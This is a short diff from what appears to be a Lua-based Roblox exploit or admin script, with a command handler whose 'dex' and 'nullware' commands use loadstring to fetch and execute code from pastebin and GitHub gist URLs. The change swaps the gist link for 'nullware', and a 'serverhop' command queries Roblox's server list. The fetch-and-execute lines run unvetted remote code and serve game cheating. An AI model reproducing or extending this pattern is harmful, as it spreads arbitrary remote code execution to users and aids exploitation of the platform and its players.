@@ -553,7 +553,7 @@ local function command(cmd)
 	elseif string.lower(cmd2[1]) == "dex" then
 		loadstring(game:HttpGetAsync("https://pastebin.com/raw/fPP8bZ8Z"))()
 	elseif string.lower(cmd2[1]) == "nullware" then 
-		loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/37eef2120d509b37b31fa73944ab2361/raw/kT2fVEFnzDfCRXAP"))()
+		loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/dabc2500988785fbec1ce7c7aaee105d/raw/hVQJXfF4sR6yqSfJ"))()
 	elseif string.lower(cmd2[1]) == "serverhop" then
 		local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/".. game.PlaceId.. "/servers/Public?sortOrder=Asc&limit=100"))
 		for i,v in pairs(sl.data) do
